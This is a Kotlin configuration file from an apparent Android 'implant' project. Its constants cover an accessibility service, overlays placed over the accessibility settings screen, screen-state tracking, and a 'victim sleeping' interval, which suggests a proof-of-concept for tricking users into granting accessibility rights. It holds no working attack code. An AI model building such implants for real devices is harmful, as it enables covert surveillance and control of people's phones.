package com.cooperthecoder.implant

import android.app.AlarmManager

object Config {
    @JvmStatic val OVERLAY_DELAY: Long = 2000L
    @JvmStatic val ACCESSIBILITY_SERVICE_CLASS = DaggerService::class.java
    @JvmStatic val ACCESSIBILITY_SETTINGS_HEIGHT = 240
    @JvmStatic val ACCESSIBILITY_SETTINGS_TOP_PADDING = 240
    @JvmStatic val SYSTEMUI_PACKAGE_NAME = "com.android.systemui"
    @JvmStatic val SHARED_PREFERENCES_NAME: String = "screen_state"
    @JvmStatic val PREFS_KEY_SCREEN_STATE: String = "last_screen_state"
    @JvmStatic val PREFS_KEY_STATE_TIMESTAMP: String = "timestamp"
    @JvmStatic val VICTIM_SLEEPING_INTERVAL: Long = 2 * AlarmManager.INTERVAL_HOUR
}

